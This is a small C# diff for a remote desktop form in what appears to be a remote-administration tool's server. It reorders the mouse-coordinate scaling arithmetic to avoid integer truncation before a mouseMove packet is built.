@@ -232,7 +232,7 @@ namespace Server.Forms
             {
                 if (pictureBox1.Image != null && this.ContainsFocus && isMouse)
                 {
-                    Point p = new Point(e.X * (rdSize.Width / pictureBox1.Width), e.Y * (rdSize.Height / pictureBox1.Height));
+                    Point p = new Point(e.X * rdSize.Width / pictureBox1.Width, e.Y * rdSize.Height / pictureBox1.Height);
                     MsgPack msgpack = new MsgPack();
                     msgpack.ForcePathObject("Packet").AsString = "remoteDesktop";
                     msgpack.ForcePathObject("Option").AsString = "mouseMove";
